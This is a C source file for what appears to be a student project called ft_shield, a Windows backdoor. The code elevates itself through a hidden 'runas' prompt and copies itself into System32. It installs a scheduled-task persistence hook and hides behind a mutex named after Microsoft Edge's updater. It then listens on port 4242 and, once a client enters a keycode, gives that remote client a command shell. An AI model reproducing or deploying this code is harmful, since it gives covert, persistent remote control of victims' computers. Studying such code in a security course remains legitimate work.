/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: zcadinot <zcadinot@student.42lehavre.      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/10/19 18:02:57 by zcadinot          #+#    #+#             */
/*   Updated: 2026/10/22 16:33:49 by zcadinot         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ft_shield.h"
#include <lmcons.h>
#include <stdarg.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#define MAX_CLIENTS 3

void debug_printf(const char *format, ...)
{
#ifdef DEBUG
    va_list args;

    va_start(args, format);
    vprintf(format, args);
    va_end(args);
#else
    (void)format;
#endif
}

typedef struct s_client
{
    SOCKET  socket;
    int     authenticated;
    int     shell_mode;
    long    bytes_in;
    long    bytes_out;
    t_cmd   cmd;
}   t_client;

static int cli_send(t_client *client, SOCKET socket, const char *buf, int len)
{
    int sent;

    sent = send(socket, buf, len, 0);
    if (sent > 0)
        client->bytes_out += sent;
    return sent;
}

SOCKET init_server(void)
{
    WSADATA             wsa_data;
    SOCKET              sock;
    struct sockaddr_in  server_addr;
    int                 error;

    error = WSAStartup(MAKEWORD(2, 2), &wsa_data);
    if (error != 0)
    {
        debug_printf("Error: WSAStartup failed: %d\n", error);
        return INVALID_SOCKET;
    }
    debug_printf("Success: Winsock initialized\n");

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET)
    {
        debug_printf("Error: socket failed: %d\n", WSAGetLastError());
        WSACleanup();
        return INVALID_SOCKET;
    }
    debug_printf("Success: Socket initialized\n");

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    server_addr.sin_port = htons(4242);

    if (bind(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR)
    {
        debug_printf("Error: bind failed: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return INVALID_SOCKET;
    }
    debug_printf("Success: Bind initialized\n");

    if (listen(sock, SOMAXCONN) == SOCKET_ERROR)
    {
        debug_printf("Error: listen failed: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return INVALID_SOCKET;
    }
    debug_printf("Success: Server listening on port 4242\n");

    return sock;
}

int mode_daemon(void)
{
    HANDLE mutex;
    char *path;
    SOCKET server_fd;
    SOCKET client;
    SOCKET current;
    t_client clients[MAX_CLIENTS];
    fd_set fd_list;
    fd_set fd_ready;
    char buffer[1024];
    int received;
    int slot;
    int i;
    const char *help_message;

    help_message = "\n+--------------- COMMANDS ---------------+\n| ?      Show available commands        |\n| stats  Show session I/O statistics    |\n| shell  Enter safe shell mode           |\n+----------------------------------------+\n$> ";
    mutex = CreateMutexW(NULL, FALSE, L"Global\\MicrosoftEdgeUpdateMutex");
    if (mutex == NULL)
    {
        debug_printf("Erreur mutex : %lu\n", (unsigned long)GetLastError());
        return (1);
    }
    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        debug_printf("Already running...\n");
        CloseHandle(mutex);
        return (0);
    }
    if (!persistence_task_detect())
    {
        path = get_my_path();
        if (path == NULL || !task_install(path, "--daemon"))
        {
            CloseHandle(mutex);
            return (0);
        }
    }
    server_fd = init_server();
    if (server_fd == INVALID_SOCKET)
    {
        CloseHandle(mutex);
        return (1);
    }

    i = 0;
    while (i < MAX_CLIENTS)
    {
        clients[i].socket = INVALID_SOCKET;
        clients[i].authenticated = 0;
        clients[i].shell_mode = 0;
        clients[i].bytes_in = 0;
        clients[i].bytes_out = 0;
        clients[i].cmd = cmd_init();
        i++;
    }
    FD_ZERO(&fd_list);
    FD_SET(server_fd, &fd_list);

    while (1)
    {
        fd_ready = fd_list;
        if (select(0, &fd_ready, NULL, NULL, NULL) == SOCKET_ERROR)
        {
            debug_printf("Error: select failed: %d\n", WSAGetLastError());
            break;
        }
        i = 0;
        while (i < (int)fd_ready.fd_count)
        {
            current = fd_ready.fd_array[i];
            if (current == server_fd)
            {
                client = accept(server_fd, NULL, NULL);
                if (client == INVALID_SOCKET)
                    debug_printf("Error: accept failed: %d\n", WSAGetLastError());
                else
                {
                    slot = 0;
                    while (slot < MAX_CLIENTS && clients[slot].socket != INVALID_SOCKET)
                        slot++;
                    if (slot == MAX_CLIENTS)
                    {
                        send(client, "Server full\n", 12, 0);
                        closesocket(client);
                    }
                    else
                    {
                        clients[slot].socket = client;
                        clients[slot].authenticated = 0;
                        clients[slot].shell_mode = 0;
                        clients[slot].bytes_in = 0;
                        clients[slot].bytes_out = 0;
                        clients[slot].cmd = cmd_init();
                        FD_SET(client, &fd_list);
                        cli_send(&clients[slot], client, "Keycode: ", 9);
                        log_write("CONNECT");
                        debug_printf("Client connected: %llu\n", (unsigned long long)client);
                    }
                }
            }
            else
            {
                slot = 0;
                while (slot < MAX_CLIENTS && clients[slot].socket != current)
                    slot++;
                if (slot < MAX_CLIENTS)
                {
                    received = recv(current, buffer, sizeof(buffer) - 1, 0);
                    if (received > 0)
                        clients[slot].bytes_in += received;
                    if (received <= 0)
                    {
                        debug_printf("Client disconnected: %llu\n",
                                (unsigned long long)current);
                        cmd_stop(&clients[slot].cmd);
                        FD_CLR(current, &fd_list);
                        closesocket(current);
                        clients[slot].socket = INVALID_SOCKET;
                        clients[slot].authenticated = 0;
                        clients[slot].shell_mode = 0;
                        log_write("DISCONNECT (in: %ld, out: %ld)",
                            clients[slot].bytes_in, clients[slot].bytes_out);
                    }
                    else
                    {
                        buffer[received] = '\0';
                        while (received > 0 && (buffer[received - 1] == '\n' || buffer[received - 1] == '\r'))
                            buffer[--received] = '\0';
                        if (!clients[slot].authenticated)
                        {
                            if (password_check(buffer))
                            {
                                clients[slot].authenticated = 1;
                                log_write("AUTH OK");
                                cli_send(&clients[slot], current,
                                    "Authentication success\n$> ", 26);
                            }
                            else
                            {
                                log_write("AUTH FAIL");
                                cli_send(&clients[slot], current,
                                    "Wrong keycode\nKeycode: ", 23);
                            }
                        }
                        else if (clients[slot].shell_mode)
                        {
                            if (strcmp(buffer, "exit") == 0)
                            {
                                cmd_stop(&clients[slot].cmd);
                                clients[slot].shell_mode = 0;
                                cli_send(&clients[slot], current,
                                    "Leaving shell\n$> ", 17);
                            }
                            else
                            {
                                debug_printf("Shell command from %llu: %s\n",
                                        (unsigned long long)current, buffer);
                                log_write("SHELL: %s", buffer);
                                if (!cmd_exec(&clients[slot].cmd, buffer))
                                {
                                    cli_send(&clients[slot], current,
                                        "Failed to execute command\nshell> ",
                                        33);
                                }
                                else if (!cmd_send_output(&clients[slot].cmd, current))
                                {
                                    cli_send(&clients[slot], current,
                                        "Failed to read command output\n",
                                        30);
                                }
                                else
                                    cli_send(&clients[slot], current,
                                        "\nshell> ", 8);
                            }
                        }
                        else
                        {
                            if (strcmp(buffer, "?") == 0)
                                cli_send(&clients[slot], current, help_message,
                                    (int)strlen(help_message));
                            else if (strcmp(buffer, "stats") == 0)
                            {
                                char stats[96];

                                snprintf(stats, sizeof(stats),
                                    "Received: %ld bytes | Sent: %ld bytes\n$> ",
                                    clients[slot].bytes_in,
                                    clients[slot].bytes_out);
                                cli_send(&clients[slot], current, stats,
                                    (int)strlen(stats));
                            }
                            else if (strcmp(buffer, "shell") == 0)
                            {
                                cmd_stop(&clients[slot].cmd);
                                clients[slot].cmd = cmd_init();
                                if (!cmd_start(&clients[slot].cmd))
                                {
                                    debug_printf("Client %llu: failed to start shell\n",
                                            (unsigned long long)current);
                                    cli_send(&clients[slot], current,
                                        "Shell failed to start\n$> ", 25);
                                }
                                else
                                {
                                    clients[slot].shell_mode = 1;
                                    cli_send(&clients[slot], current,
                                        "Shell started\nshell> ", 21);
                                }
                            }
                            else
                            {
                                debug_printf("Client %llu: %s\n", (unsigned long long)current, buffer);
                                log_write("CMD: %s", buffer);
                                cli_send(&clients[slot], current,
                                    "Message received\n$> ", 20);
                            }
                        }
                    }
                }
            }
            i++;
        }
    }

    i = 0;
    while (i < MAX_CLIENTS)
    {
        if (clients[i].socket != INVALID_SOCKET)
            closesocket(clients[i].socket);
        i++;
    }
    closesocket(server_fd);
    WSACleanup();
    CloseHandle(mutex);
    return (1);
}

int mode_kill(void)
{
    HANDLE snapshot;
    PROCESSENTRY32 entry;
    HANDLE process;
    char self[MAX_PATH];
    DWORD self_pid;
    int killed;

    killed = 0;
    self_pid = GetCurrentProcessId();
    if (GetModuleFileNameA(NULL, self, MAX_PATH) == 0)
        self[0] = '\0';
    task_uninstall();
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE)
        return (0);
    entry.dwSize = sizeof(entry);
    if (Process32First(snapshot, &entry))
    {
        do {
            if (strcmp(entry.szExeFile, "ft_shield.exe") != 0
                || entry.th32ProcessID == self_pid)
                continue ;
            process = OpenProcess(PROCESS_TERMINATE | SYNCHRONIZE, FALSE,
                entry.th32ProcessID);
            if (process == NULL)
                continue ;
            if (TerminateProcess(process, 0))
            {
                WaitForSingleObject(process, 3000);
                killed++;
            }
            CloseHandle(process);
        } while (Process32Next(snapshot, &entry));
    }
    CloseHandle(snapshot);
    debug_printf("Killed %d instance(s)\n", killed);
    return (0);
}

int spawn_elevated(void)
{
    char path[MAX_PATH];
    SHELLEXECUTEINFOA info = {0};

    if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0)
        return (0);
    info.cbSize = sizeof(info);
    info.lpVerb = "runas";
    info.lpFile = path;
    info.nShow = SW_HIDE;
    if (!ShellExecuteExA(&info))
        return (0);
    return (1);
}

int mode_normal(void)
{
    if (is_elevated() <= 0)
        return (spawn_elevated());
    char login[UNLEN + 1];
    DWORD size = sizeof(login);
    char *mpath;

    if (!GetUserNameA(login, &size))
    {
        debug_printf("Erreur : %lu\n", (unsigned long)GetLastError());
        return (0);
    }

    if ((mpath = get_my_path()) == NULL)
    {
        debug_printf("Erreur : %lu\n", (unsigned long)GetLastError());
        return (0);
    }

    const char *dst = "C:\\Windows\\System32\\ft_shield.exe";


    if (!CopyFileA(mpath, dst, FALSE) && GetLastError() != ERROR_FILE_EXISTS)
    {
        debug_printf("Erreur : %lu\n", (unsigned long)GetLastError());
        return (1);
    }

    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    WCHAR command_line[] = L"\"C:\\Windows\\System32\\ft_shield.exe\" --daemon";

    si.cb = sizeof(si);
    if (!CreateProcessW(L"C:\\Windows\\System32\\ft_shield.exe", command_line, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, L"C:\\Windows\\System32", &si, &pi))
    {
        debug_printf("CreateProcessW erreur : %lu\n",
            (unsigned long)GetLastError());
        return (1);
    }
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    printf("%s\n", login);

    /* while (1) */
    /* { */
    /*     continue; */
    /* } */
    return (1);
}

int main(int argc, char **argv)
{
    if (AttachConsole(ATTACH_PARENT_PROCESS))
    {
        freopen("CONOUT$", "w", stdout);
        freopen("CONOUT$", "w", stderr);
    }
    if (argc == 2 && strcmp(argv[1], "--daemon") == 0)
        return (mode_daemon());
    if (argc == 2 && strcmp(argv[1], "--kill") == 0)
        return (mode_kill());

    return (mode_normal());
}
